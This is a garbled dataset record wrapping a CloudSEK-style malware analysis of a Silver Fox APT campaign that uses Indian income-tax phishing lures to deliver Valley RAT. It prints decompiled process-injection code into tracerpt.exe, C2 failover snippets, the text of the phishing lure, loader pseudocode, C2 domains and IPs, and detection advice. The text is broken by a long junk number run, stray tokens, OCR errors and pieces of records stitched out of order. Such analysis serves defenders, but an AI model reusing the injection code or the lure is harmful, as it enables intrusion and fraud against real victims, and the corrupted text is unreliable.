hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "wcscpy_s(&current_c2_addr,0xFFu,config_p2_secondary_c2);wcscpy_s(&current_c2_port,0x1Eu,config_o2_secondary_c2);", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "wcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr 